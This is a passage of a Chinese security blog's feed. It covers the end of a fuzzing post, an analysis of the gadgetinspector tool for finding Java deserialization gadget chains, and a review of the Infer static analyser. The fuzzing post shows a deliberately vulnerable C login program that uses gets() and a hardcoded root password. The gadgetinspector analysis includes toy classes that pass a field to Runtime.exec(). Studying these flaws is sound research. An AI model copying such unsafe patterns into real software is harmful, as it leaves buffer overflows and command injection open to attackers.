class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; login[&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; passwd[&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Login: \n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    gets(login);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Password: \n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    gets(passwd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(login, &lt;span class=&quot;string&quot;&gt;&quot;root&quot;&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(passwd, &lt;span class=&quot;string&quot;&gt;&quot;1qazxsw2&quot;&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Access Granted.\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Access Denied.\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Fuzz" scheme="http://anemone.top/categories/Fuzz/"/>
    
    
      <category term="Fuzz" scheme="http://anemone.top/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Automated Discovery of Deserialization Gadget Chain解读</title>
    <link href="http://anemone.top/deserialize-AutoFindPOP/"/>
    <id>http://anemone.top/deserialize-AutoFindPOP/</id>
    <published>2019-08-24T07:15:43.000Z</published>
    <updated>2019-09-22T10:14:18.661Z</updated>
    
    <content type="html"><![CDATA[<p>文章来自Automated Discovery of Deserialization Gadget Chains, Blackhat2018</p><p>文章：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></p><a id="more"></a><p>演讲视频：<a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> </p><p>工具：<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><p>看下来的感觉就是将jar包里的（可以反序列化的）所有类的属性设为污点（因为反序列化时攻击者都可以控制），接下来做污点传播，Source为toString()，equals()等方法，Sink为Runtime.exec()，Method.invoke()，URL.openStream等方法，而污点清除函数就是黑名单类中的所有函数。</p><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>枚举包内的所有类和方法，对于类收集其父类和子类集合：</p><p><img src="/deserialize-AutoFindPOP/1566118462274.png" alt="1566118462274"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;ClassReference&gt; discoveredClasses</span><br><span class="line">ClassReference(name, superClass, interfaces isInterface, members)</span><br><span class="line">ClassReference.Handle(name)</span><br><span class="line">List&lt;MethodReference&gt; discoveredMethod</span><br><span class="line">MethodReference(classReference, name, desc, isStatic)</span><br><span class="line">MethodReference.Handle(classReference, name, desc)</span><br><span class="line">InheritanceMap //记录了一个类的父类和子类集合，因为一个类拥有其父类的所有方法</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap</span><br></pre></td></tr></table></figure><h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>发现函数传递的数据流，如代码段1中invoke可以传递对象value(0)，代码段2中invoke既可以传递arg(1)也可以传递value(0)，因为我们假设（a）受污染的对象中，所有成员变量都是受污染的（b）程序中所有分支都是可达的（污染传播都是这样做的），0和1为参数index，0代表this。在此之前要先分析函数调用关系，因为如果有A函数：<code>FuncA(){return FuncB();}</code>，那么A函数的返回与B函数有关。</p><p><img src="/deserialize-AutoFindPOP/1566118415853.png" alt="1566118415853"></p><p>output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow</span><br><span class="line">MethodReferenceHandle(classReference, name, desc)</span><br><span class="line">Set&lt;Integer&gt; // 返回一系列污点 0表示this，1为arg1</span><br></pre></td></tr></table></figure><h2 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h2><p>构建调用图，即函数A将自身参数arg1传递给函数B的参数arg2 FuncA@1-&gt;FuncB@2</p><p><img src="/deserialize-AutoFindPOP/1566118496226.png" alt="1566118496226"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;GraphCall&gt; discoveredCalls</span><br><span class="line">GraphCall(caller.Method, targetMethod, callerArgIndex, callerargPath, targetArgIndex)</span><br><span class="line">// 调用函数, 被调函数, 调用函数传递参数idx，路径，被调函数传入参数idx</span><br></pre></td></tr></table></figure><p>构图时，只考虑存在污点的边：</p><p><img src="/deserialize-AutoFindPOP/1566215882715.png" alt="1566215882715"></p><p>这里发现gadgetinspector.TaintTrackingMethodVisitor#getStackTaint有点问题，每次get的时候并未拿到Taint</p><h2 id="Step4"><a href="#Step4" class="headerlink" title="Step4"></a>Step4</h2><p>枚举入口，如hashCode，toString，程序只能发现已知入口的POP链</p><p><img src="/deserialize-AutoFindPOP/1566120657753.png" alt="1566120657753"></p><p>Output：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Source&gt; discoveredSources</span><br><span class="line">Source(sourceMethod, taintedArgIndex) <span class="comment">//index0=this</span></span><br></pre></td></tr></table></figure><h2 id="Step5"><a href="#Step5" class="headerlink" title="Step5"></a>Step5</h2><p>BFS搜索图找到chains</p><p><img src="/deserialize-AutoFindPOP/1566302159606.png" alt="1566302159606"></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>断点打gadgetinspector.GadgetInspector#main</p><h2 id="污点传播（Step2-Step3）"><a href="#污点传播（Step2-Step3）" class="headerlink" title="污点传播（Step2-Step3）"></a>污点传播（Step2-Step3）</h2><p>Step2-Step3都是通过ASM做的，例如Step3：</p><p><img src="/deserialize-AutoFindPOP/1566214430085.png" alt="1566214430085"></p><p>其中继承了基本Visitor：</p><p>gadgetinspector.TaintTrackingMethodVisitor，该类模拟函数执行，主要污点传播逻辑都在这</p><h3 id="visitMethodInsn"><a href="#visitMethodInsn" class="headerlink" title="visitMethodInsn"></a>visitMethodInsn</h3><p>字节码调用函数时会触发该函数，对于污点传播而言，应该做如下事情</p><ul><li>从堆栈取出参数</li><li>检查函数的参数是否存在污点</li><li>返回函数结果是否存在污点</li><li>将结果推入堆栈</li></ul><p>实际上就是模拟了一个函数的调用过程，如果函数中有嵌套调用那么情况会更复杂</p><p>其属性savedVariableState.StackVars记录着函数参数，及其是否有污点：</p><p><img src="/deserialize-AutoFindPOP/1567047086609.png" alt="1567047086609"></p><p>如上图，该函数（StringBuilder.append()）有两个参数，第一个参数是this，有污点，第二个参数无污点。</p><h3 id="特殊的传播"><a href="#特殊的传播" class="headerlink" title="特殊的传播"></a>特殊的传播</h3><p>在gadgetinspector.TaintTrackingMethodVisitor#PASSTHROUGH_DATAFLOW处定义了一些特殊的传播，保证污点能够向后传播，比如说String类型<code>A+Taint</code>的传播，idx1，idx2，idx3分别是类，函数名，函数签名，后面是能够传播的污点参数idx，如StringBuilder.append()会将参数0，参数1传播：</p><p><img src="/deserialize-AutoFindPOP/1566974563078.png" alt="1566974563078"></p><p>而gadgetinspector.TaintTrackingMethodVisitor#visitMethodInsn这里需要处理函数参数调用传播污点的情况，如<code>A(B(xxx))</code></p><h2 id="SINK点"><a href="#SINK点" class="headerlink" title="SINK点"></a>SINK点</h2><p>Sink点定义在gadgetinspector.GadgetChainDiscovery#isSink：</p><p><img src="/deserialize-AutoFindPOP/1566288878759.png" alt="1566288878759"></p><h2 id="判断该类是否可以反序列化"><a href="#判断该类是否可以反序列化" class="headerlink" title="判断该类是否可以反序列化"></a>判断该类是否可以反序列化</h2><p>对于java原生序列化，判断逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#applyNoCache，其他序列化方法找对应的包名。</p><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>对于java原生序列化，逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#isBlacklistedClass，可以追加黑名单。</p><h1 id="程序的一个Issue"><a href="#程序的一个Issue" class="headerlink" title="程序的一个Issue"></a>程序的一个Issue</h1><p>原版污点传播存在一个Bug，考虑如下情况：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里程序无法发现gadget，因为在读取getcmd()字节码后，污点传播执行如下代码（TaintTrackingMethodVisitor.java#L675）向外传播污点：</p><p><img src="/deserialize-AutoFindPOP/1566980149628.png" alt="1566980149628"></p><p>这一意思是说，如果passthroughDataflow（第二步）计算得到getcmd能够传播污点，那么该污点将作为参数推入堆栈（即传播到exec()函数参数上），但是这里的passthroughDataflow并没有B.getcmd()的记录，只有A.getcmd()记录——因为B.getcmd()继承A.getcmd()，因此污点传播中断了。</p><p>因此需要寻找其父类查看是否有该方法，将图中的代码块换成如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (passthroughDataflow != <span class="keyword">null</span>) &#123;</span><br><span class="line">    Set&lt;Integer&gt; passthroughArgs = passthroughDataflow.get(methodHandle);</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs == <span class="keyword">null</span> &amp;&amp; inheritanceMap!=<span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// FIXME ClassA-&gt;ClassB-&gt;ClassC</span></span><br><span class="line">        <span class="comment">//  ClassA.func(), ClassB.func(), ClassC.func()==ClassB.func()!=ClassA.func();</span></span><br><span class="line">        <span class="comment">//  now taint will passthrough if ClassB.func() or ClassA.func() can passthrough.</span></span><br><span class="line">        <span class="comment">//  So FP will arrise.</span></span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses=inheritanceMap.getSuperClasses(clzHandle);</span><br><span class="line">        <span class="keyword">if</span>(superClasses!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle superClzHandle: superClasses)&#123;</span><br><span class="line">                List&lt;Set&lt;Integer&gt;&gt; list=passthroughDataflow.entrySet().stream()</span><br><span class="line">                        .filter(e-&gt;(e.getKey().getClassReference().equals(superClzHandle)</span><br><span class="line">                                &amp;&amp; e.getKey().getName().equals(name)</span><br><span class="line">                                &amp;&amp; e.getKey().getDesc().equals(desc)))</span><br><span class="line">                        .map(e-&gt;e.getValue())</span><br><span class="line">                        .collect(Collectors.toList());</span><br><span class="line">                <span class="keyword">if</span>(!list.isEmpty())&#123;</span><br><span class="line">                    passthroughArgs=list.get(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> arg : passthroughArgs) &#123;</span><br><span class="line">            resultTaint.addAll(argTaint.get(arg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样就还存在一个问题，因为gadgetinspector.data.InheritanceMap#getSuperClasses返回的是一个集合，因此，我们并没法知道真实调用exec()的是哪一个函数：</p><p><img src="/deserialize-AutoFindPOP/1566981439728.png" alt="1566981439728"></p><p>考虑如下例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"whoami"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，前面的代码会返回getcmd()传播污点——父类的任意一个getcmd()能传污点就有污点，但是实际上其并没有污点，因为实际上getcmd()调用的是B.getcmd()，因此会产生误报，预计使用接口的话这一点会更加明显。</p><h1 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h1><ul><li><p>无视控制流，导致误报</p></li><li><p>无法识别反射的SINK点，导致漏报</p></li></ul><p><strong>相关代码：</strong><a href="https://github.com/Anemone95/gadgetinspector" target="_blank" rel="noopener">https://github.com/Anemone95/gadgetinspector</a></p><h1 id="附录：ASM源码"><a href="#附录：ASM源码" class="headerlink" title="附录：ASM源码"></a>附录：ASM源码</h1><p>其污点传播用ASM做的，因此记一下关于ASM的一些使用方法</p><h2 id="ClassReader"><a href="#ClassReader" class="headerlink" title="ClassReader"></a>ClassReader</h2><h2 id="ClassVisitor"><a href="#ClassVisitor" class="headerlink" title="ClassVisitor"></a>ClassVisitor</h2><p>定义在读取Class字节码时会触发的事件，如类头解析完成、注解解析、字段解析、方法解析等。</p><h2 id="MethodVisitor"><a href="#MethodVisitor" class="headerlink" title="MethodVisitor"></a>MethodVisitor</h2><p>定义在解析方法时触发的事件，如方法上的注解、属性、代码等。这里只是操作码不含操作数</p><p>visitInsn：IALOAD~SALOAD触发该函数</p><p>visitVarInsn(opcode, var)：ILOAD~ALOAD触发该函数，var为操作数</p><p>B4 getfield</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章来自Automated Discovery of Deserialization Gadget Chains, Blackhat2018&lt;/p&gt;&lt;p&gt;文章：&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全-反序列化" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="反序列化" scheme="http://anemone.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Javam" scheme="http://anemone.top/tags/Javam/"/>
    
      <category term="自动化" scheme="http://anemone.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
      <category term="污点传播" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E4%BC%A0%E6%92%AD/"/>
    
  </entry>
  
  <entry>
    <title>Infer试用以及扫描原理分析</title>
    <link href="http://anemone.top/whitebox-infer/"/>
    <id>http://anemone.top/whitebox-infer/</id>
    <published>2019-08-24T01:27:49.000Z</published>
    <updated>2019-09-22T10:14:18.706Z</updated>
    
    <content type="html"><![CDATA[<p>Infer作为facebook 开源的使用 ocaml 开发静态代码检测工具，作为公司的产品调研对象，本文就其使用和原理两方面进行分析。</p><p>GitHub：<a href="https://github.com/facebook/infer" target="_blank" rel="noopener">https://github.com/facebook/infer</a></p><p>教程：<a href="https://infer.liaohuqiu.net/" target="_blank" rel="noopener">https://infer.liaohuqiu.net/</a></p><a id="more"></a><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Gradle</span></span><br><span class="line">infer -- gradle &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line">infer -- ./gradlew &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line"><span class="comment"># Maven</span></span><br><span class="line">infer -- mvn &lt;maven target&gt;</span><br></pre></td></tr></table></figure><h1 id="检测能力"><a href="#检测能力" class="headerlink" title="检测能力"></a>检测能力</h1><p>官网上看到能够检测到的问题有：</p><p>Java：</p><ul><li>Resource Leak</li><li>Null dereference</li></ul><p>C and Objective-C</p><ul><li>Resource leak</li><li>Memory leak</li><li>Null dereference</li><li>Parameter not null checked</li><li>Ivar not null checked</li><li>Premature nil termination argument</li></ul><p>Bugs reported only in Objective-C</p><ul><li>Retain cycle</li></ul><p>参见：<a href="https://infer.liaohuqiu.net/docs/infer-bug-types.html" target="_blank" rel="noopener">https://infer.liaohuqiu.net/docs/infer-bug-types.html</a></p><p>但是定位到源代码：<a href="https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.ml后，发现其还能检测其存在注入类型的漏洞，不知为何没有扫描到。" target="_blank" rel="noopener">https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.ml后，发现其还能检测其存在注入类型的漏洞，不知为何没有扫描到。</a></p><h1 id="试用"><a href="#试用" class="headerlink" title="试用"></a>试用</h1><p>Webgoat检测到16个问题，14个空引用和2个资源泄露：</p><p><img src="/whitebox-infer/1566373102585.png" alt="1566373102585"></p><p>扫描InsecureBankv2:</p><p><img src="/whitebox-infer/1566370930925.png" alt="1566370930925"></p><h1 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h1><ul><li><p>增量分析</p></li><li><p>能够分析大规模程序</p></li></ul><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><a href="https://infer.liaohuqiu.net/docs/separation-logic-and-bi-abduction.html" target="_blank" rel="noopener">分离逻辑（separation logic）和双向假说推理（bi-abduction）</a>，<a href="https://en.wikipedia.org/wiki/Hoare_logic" target="_blank" rel="noopener">霍尔逻辑</a>和<a href="https://en.wikipedia.org/wiki/Abstract_interpretation" target="_blank" rel="noopener">抽象解释</a>，分离逻辑用来检测bug，双向假说推理用来做增量分析。</p><h2 id="分离逻辑"><a href="#分离逻辑" class="headerlink" title="分离逻辑"></a>分离逻辑</h2><p>一开始用于内存管理的逻辑</p><script type="math/tex; mode=display">x\mapsto y * y\mapsto x</script><p>$x \mapsto y$ 指指针x指向值y（x points to y），$A*B$指A和B处于分离的两块内存中（and separately），因此以上公式被叫做（x 指向y，同时y指向x），可以用下图表示：</p><p><img src="/whitebox-infer/SepSplit.jpg" alt="static/images/SepSplit.jpg"></p><p>接着使用Hoare三元组${pre}prog{post}$，表示程序行为，$pre$指前置条件，$prog$指程序片段$post$为后置条件。例如使用Hoare三元组描述一个关闭资源的函数：</p><script type="math/tex; mode=display">\{r\mapsto open\}closeResource(r)\{r\mapsto closed\}(spec)</script><p>它说明，一个正确的关闭资源的函数运行前，r资源应该是打开的，运行后r资源应该是关闭的，如果不符合则代码有问题。</p><p>那么若有两个资源$r_1$和$r_2$仅关闭$r_1$可以表示成：</p><script type="math/tex; mode=display">\{r_1\mapsto open * r_2\mapsto open\}closeResource(r_1)\{r_1\mapsto closed * r_2\mapsto open\}(use)</script><p>这里使用了一个小规范（spec）去更新了一个大规范（use），更一般的，我们有：</p><script type="math/tex; mode=display">\{pre\}prog\{post\}\rightarrow\{pre*frame\}prog\{post*frame\}</script><p>这一规则也被称为逻辑分离中的frame规则，$frame$描述了不变的状态，属于来自于就像动画场景中背景（frame）——动画场景中背景不会变。</p><p>这一规则用于数学推理，它揭示了逻辑推理应该聚焦于程序访问资源的那一块逻辑，并且分离的两块可以独立分析。</p><h2 id="双向假说推理"><a href="#双向假说推理" class="headerlink" title="双向假说推理"></a>双向假说推理</h2><p>A推出B表示为：</p><script type="math/tex; mode=display">A \vdash B</script><p>在传统逻辑推理中，一个推理问题被定义为：</p><ul><li><p>给定假设A和目标G</p></li><li><p>找到一个M，使如下公式成立：</p><script type="math/tex; mode=display">A \land M \vdash G</script></li></ul><p>应用到分离逻辑问题，即：</p><script type="math/tex; mode=display">A * M \vdash G</script><p>双向假说推理将问题拓展成：</p><script type="math/tex; mode=display">A*?antiframe \vdash G*?frame</script><p>即infer需要找到一对$antiframe$和$frame$让上式成立。</p><p>这在做增量扫描是很重要。</p><p>为了说明问题，例如我们有如下函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">lst_nd* <span class="title">q</span><span class="params">(lst_nd *y)</span> </span>&#123; <span class="comment">// Inferred Pre: list(y) </span></span><br><span class="line">    lst_nd *x, *z;</span><br><span class="line">    x=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); x-&gt;tail=<span class="number">0</span>;</span><br><span class="line">    z=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); z-&gt;tail=<span class="number">0</span>; <span class="comment">// Abducted: list(y), Framed: z|-&gt;0 </span></span><br><span class="line">    merge(x,y); <span class="comment">// Obtained Post: list(x)*z|-&gt;0 </span></span><br><span class="line">    merge(x,z); <span class="comment">// Obtained Post: list(x) </span></span><br><span class="line">    <span class="keyword">return</span>(x);</span><br><span class="line">&#125; <span class="comment">// Inferred Post: list(ret)</span></span><br><span class="line"><span class="function"><span 